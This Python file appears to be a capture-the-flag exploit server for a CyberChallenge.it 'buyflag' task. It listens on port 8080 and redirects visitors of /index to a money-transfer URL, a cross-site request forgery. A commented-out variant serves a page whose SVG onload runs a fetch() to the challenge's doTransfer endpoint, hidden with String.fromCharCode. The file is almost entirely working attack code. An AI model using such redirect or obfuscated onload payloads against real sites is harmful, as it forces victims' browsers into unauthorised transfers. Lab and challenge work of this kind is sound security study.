from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"Captured request: {self.path}")  # Log request path

        if self.path == "/index":
            # self.send_response(200)
            # self.send_header("Content-Type", "text/html")
            # self.end_headers()
            # js_payload = """<!DOCTYPE html>
            # <html>
            # <head>
            #     <title>Exploitation</title>
            # </head>
            # <body>
            #     <svg onload="eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,98,117,121,102,108,97,103,46,99,104,97,108,108,115,46,99,121,98,101,114,99,104,97,108,108,101,110,103,101,46,105,116,47,100,111,84,114,97,110,115,102,101,114,46,112,104,112,63,116,111,61,50,51,48,57,38,97,109,111,117,110,116,61,49,48,39,41));"></svg>
            #     <p>Loading...</p>
            # </body>
            # </html>
            # """
            # self.wfile.write(js_payload.encode())
            # print("[*] Served JavaScript payload to client.")
            # return
            self.send_response(301) # redirect to localhost/doTransfer.php?to=2309&amount=10'
            self.send_header("Location", "http://localhost/doTransfer.php?to=2309&amount=10")
            self.end_headers()
            print("[*] Redirected to localhost/doTransfer.php?to=2309&amount=10")
            return


        # Default response
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b'OK')

server = HTTPServer(('0.0.0.0', 8080), RequestLogger)
print("Listening on port 8080...")
server.serve_forever()
